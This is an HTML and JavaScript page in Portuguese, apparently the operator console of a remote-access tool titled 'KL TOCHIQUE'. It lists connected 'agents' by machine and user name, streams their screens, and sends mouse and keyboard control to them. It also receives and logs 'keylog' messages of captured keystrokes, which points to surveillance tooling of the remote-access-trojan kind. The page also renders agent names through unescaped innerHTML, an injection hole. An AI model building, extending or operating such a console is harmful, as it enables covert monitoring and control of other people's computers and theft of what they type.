<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>KL TOCHIQUE - CONSOLE</title>
<style>
/* CSS MANTIDO E MELHORADO */
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
:root{--bg:#050807;--panel:rgba(9,15,12,.88);--panel-2:rgba(12,22,17,.78);--line:rgba(84,255,160,.15);--line-strong:rgba(84,255,160,.28);--green:#54ffa0;--green-2:#2ee67c;--text:#e7fff0;--shadow:#1a1b1c;}
body,html{height:100%;margin:0;padding:0;}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);}
#agents{padding:20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:15px;}
.agent{border-radius:12px;padding:15px;background:var(--panel);border:1px solid var(--line);transition:0.3s;}
.agent h3{margin:0 0 5px 0;font-family:'IBM Plex Mono',monospace;color:var(--green);}
.agent span{display:block;font-size:0.8em;color:#7f9a89;margin-bottom:10px;}
button{background:var(--green);color:#000;border:none;padding:8px 15px;border-radius:5px;cursor:pointer;font-weight:600;font-family:'IBM Plex Mono',monospace;}
button:hover{background:var(--green-2);}
#screenWrap{margin:20px;display:flex;justify-content:center;}
canvas{cursor:crosshair;border-radius:8px;border:2px solid var(--line);background:#000;max-width:100%;height:auto;box-shadow:0 0 20px rgba(0,0,0,0.5);}
.control-banner{position:fixed;top:10px;left:50%;transform:translateX(-50%);padding:8px 15px;background:rgba(255,77,109,0.2);color:var(--text);border:1px solid var(--danger);border-radius:4px;z-index:100;display:none;}
#metrics{padding:20px;display:flex;gap:20px;font-family:'IBM Plex Mono',monospace;font-size:0.9em;}
.metric-box{background:var(--panel);padding:10px;border-radius:5px;border:1px solid var(--line);}
.config-panel{padding:20px;background:var(--panel);border-bottom:1px solid var(--line);display:flex;gap:10px;align-items:center;}
input{background:#07100b;border:1px solid var(--line);color:white;padding:8px;border-radius:4px;font-family:'IBM Plex Mono',monospace;}
</style>
</head>
<body>

<div class="config-panel">
    <input id="wsUrl" type="text" placeholder="URL do Servidor (wss://...)">
    <input id="token" type="password" placeholder="Token de Admin">
    <button id="connectBtn">Conectar</button>
    <span id="connStatus" style="font-size:0.8em;"></span>
</div>

<div id="controlBanner" class="control-banner">🔴 Controle remoto ativo</div>

<div id="agents">
    <h2 style="grid-column: 1/-1; font-family:'IBM Plex Mono';">Agentes Online</h2>
    <!-- Agentes serão renderizados aqui via JS -->
</div>

<div id="screenWrap">
    <canvas id="screen"></canvas>
</div>

<div id="metrics">
    <div class="metric-box">FPS: <span id="fps">0</span></div>
    <div class="metric-box">Bitrate: <span id="bitrate">0</span> Mbps</div>
    <div class="metric-box">Frames: <span id="frames">0</span></div>
    <div class="metric-box">Drops: <span id="drops">0</span></div>
</div>

<script>
/**
 * CONFIGURAÇÃO DO SISTEMA
 * Substitua os valores abaixo se necessário
 */
let ws = null;
let selectedAgentId = null;
const canvas = document.getElementById('screen');
const ctx = canvas.getContext('2d');

// Elementos da UI
const connStatus = document.getElementById('connStatus');
const agentsContainer = document.getElementById('agents');
const controlBanner = document.getElementById('controlBanner');

// --- FUNÇÕES DE CONEXÃO ---

function connect() {
    const url = document.getElementById('wsUrl').value;
    const token = document.getElementById('token').value;

    if (!url) return alert("Insira a URL do servidor!");

    ws = new WebSocket(url);
    ws.binaryType = 'arraybuffer'; // Importante para streaming de vídeo

    ws.onopen = () => {
        console.log('Conectado!');
        connStatus.textContent = "Conectado";
        connStatus.style.color = "var(--green)";
        // Envia o token para autenticação
        send({ type: 'admin_hello', token: token });
    };

    ws.onmessage = async (event) => {
        if (typeof event.data === 'string') {
            const msg = JSON.parse(event.data);
            handleTextMessage(msg);
        } else {
            // Se for binário, é o frame de vídeo
            renderFrame(event.data);
        }
    };

    ws.onclose = () => {
        connStatus.textContent = "Desconectado";
        connStatus.style.color = "var(--danger)";
        controlBanner.style.display = 'none';
    };

    ws.onerror = (err) => {
        console.error('Erro WS:', err);
        connStatus.textContent = "Erro de Conexão";
    };
}

function handleTextMessage(msg) {
    switch (msg.type) {
        case 'agent_list':
            renderAgents(msg.agents);
            break;
        case 'metrics':
            updateMetrics(msg);
            break;
        case 'keylog':
            console.log('Keylog:', msg.key, msg.down);
            break;
        case 'error':
            alert('Erro: ' + msg.message);
            break;
    }
}

function send(obj) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify(obj));
    }
}

// --- RENDERIZAÇÃO DE VÍDEO ---

function renderFrame(buffer) {
    // O Agente envia JPEG. Criamos um blob para desenhar no canvas.
    const blob = new Blob([buffer], { type: 'image/jpeg' });
    const url = URL.createObjectURL(blob);
    const img = new Image();

    img.onload = () => {
        if (canvas.width !== img.width || canvas.height !== img.height) {
            canvas.width = img.width;
            canvas.height = img.height;
        }
        ctx.drawImage(img, 0, 0);
        URL.revokeObjectURL(url); // Limpa memória
        updateFrameCount();
    };
    img.src = url;
}

let frameCount = 0;
function updateFrameCount() {
    frameCount++;
    document.getElementById('frames').textContent = frameCount;
}

// --- CONTROLE REMOTO (MOUSE E TECLADO) ---

// 1. Mouse
canvas.addEventListener('mousedown', (e) => handleMouseEvent(e, true));
canvas.addEventListener('mouseup', (e) => handleMouseEvent(e, false));
canvas.addEventListener('mousemove', (e) => {
    if (e.buttons > 0) handleMouseEvent(e, true, true); // Drag
});

function handleMouseEvent(e, isDown, isMove = false) {
    if (!selectedAgentId) return;

    const rect = canvas.getBoundingClientRect();
    // Normaliza para 0.0 - 1.0
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;

    if (isMove) {
        send({ type: 'control_input', agentId: selectedAgentId, kind: 'move', x, y });
    } else {
        let button = 'left';
        if (e.button === 2) button = 'right';
        if (e.button === 1) button = 'middle';

        send({
            type: 'control_input',
            agentId: selectedAgentId,
            kind: 'mouse',
            button: button,
            down: isDown,
            x, y
        });
    }
}

// 2. Teclado
canvas.addEventListener('keydown', (e) => {
    if (['F5', 'Tab'].includes(e.code)) e.preventDefault();
    sendControlKey(e.code, true);
});

canvas.addEventListener('keyup', (e) => {
    sendControlKey(e.code, false);
});

function sendControlKey(code, isDown) {
    if (!selectedAgentId) return;
    send({
        type: 'control_input',
        agentId: selectedAgentId,
        kind: 'key',
        code: code,
        down: isDown
    });
}

// --- UI E AGENTES ---

function renderAgents(agents) {
    agentsContainer.innerHTML = '';
    agents.forEach(agent => {
        const div = document.createElement('div');
        div.className = 'agent';
        div.innerHTML = `
            <h3>${agent.name}</h3>
            <span>${agent.user}</span>
            <button onclick="selectAgent('${agent.id}')">Conectar e Controlar</button>
        `;
        agentsContainer.appendChild(div);
    });
}

window.selectAgent = (id) => {
    selectedAgentId = id;
    controlBanner.style.display = 'block';
    console.log("Agente selecionado:", id);
    // Solicita o controle ao servidor
    send({ type: 'request_control', agentId: id });
};

function updateMetrics(m) {
    document.getElementById('fps').textContent = m.fps || 0;
    document.getElementById('bitrate').textContent = (m.bitrate / 1000000).toFixed(2);
    document.getElementById('drops').textContent = m.drops || 0;
}

// Inicialização do botão de conexão
document.getElementById('connectBtn').addEventListener('click', connect);

// Prevenir menu de contexto no canvas
canvas.addEventListener('contextmenu', e => e.preventDefault());

</script>
</body>
</html>
